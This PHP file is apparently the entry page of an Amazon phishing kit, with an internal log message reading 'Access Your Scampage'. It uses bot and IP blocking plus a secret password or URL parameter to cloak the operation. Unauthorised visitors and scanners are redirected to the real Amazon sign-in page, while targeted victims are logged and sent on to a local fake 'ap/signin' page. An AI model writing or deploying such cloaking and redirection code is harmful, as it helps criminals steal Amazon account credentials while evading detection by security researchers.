<?php
session_start();
require_once("main.php");
require_once("blocker.php");
require_once("lang.php");
if($config['block_iprange'] == "on") {
  require_once("blacklist.php");
}
if($config['onetime'] == "on") {
  require_once("onetime.php");
}
if($config['site_pass_on'] == "on") {
    $secret = md5($ip);
    $password = $_POST[$secret];
    $mypass = md5($config['site_password']);
    if(!isset($password)) {
        tulis_file("result/log_visitor.txt","| $time | $ip | $countryname | $br | $os => GAGAL MASUK");
        tulis_file("block_bot.txt","BLOCKED SITE PASSWORD || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        tulis_file("result/total_bot.txt","$ip (Site Password)");
header("location: https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
      exit();
    }else{
        $_SESSION['key'] = $key;
    }
}

if($config['site_param_on'] == "on") {
    $secret = $config['site_parameter'];
    $password = $_GET[$secret];
    if(!isset($password)) {
        tulis_file("result/log_visitor.txt","| $time | $ip | $countryname | $br | $os => GAGAL MASUK");
        tulis_file("block_bot.txt","BLOCKED SITE PARAM || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        tulis_file("result/total_bot.txt","$ip (Site Parameter)");
        header('HTTP/1.0 403 Forbidden');
header("location: https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
        exit();
    }else{
        $_SESSION['key'] = $key;
    }
}
tulis_file("result/log_visitor.txt","| $time | $ip | $countryname | $br | $os => Access Your Scampage");
tulis_file("result/total_click.txt","$ip");
echo "<script type='text/javascript'>window.top.location='ap/signin?session=".$key."';</script>";